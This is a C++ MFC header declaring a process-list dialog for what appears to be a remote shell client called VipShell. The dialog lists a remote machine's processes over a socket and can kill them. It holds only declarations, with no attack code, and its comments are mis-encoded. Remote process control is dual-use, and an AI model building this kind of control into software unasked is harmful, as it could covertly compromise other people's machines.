#pragma once


// CProcessListDlg �Ի���
#include ".\vipshellclientserver.h"
#include "afxwin.h"

class CProcessListDlg : public CDialog
{
	DECLARE_DYNAMIC(CProcessListDlg)
protected:
	DWORD _GetSelItem();
public:
	DWORD m_dwClickItem;
	bool m_dwCmpType;
	std::vector<tagVipShellProcess>* m_pVecTor;
	//����
	static int CALLBACK SortCompareStringFunc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort);
public:
	CProcessListDlg(CWnd* pParent = NULL);   // ��׼���캯��
	virtual ~CProcessListDlg();

// �Ի�������
	enum { IDD = IDD_DIALOG_PROCESSLIST };
	void BindSocket(SOCKET s)
	{
		m_hServer.Attach(s);
	}
	
	void OnInitList(std::vector<tagVipShellProcess>* pVecTor);
protected:
	CServerConnectHandle m_hServer;
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedButtonGet();
	afx_msg void OnBnClickedButtonKill();
	CListCtrl m_ListProcess;
	virtual BOOL OnInitDialog();
protected:
	virtual void OnCancel();
public:
	afx_msg void OnHdnItemclickListProcess(NMHDR *pNMHDR, LRESULT *pResult);
};
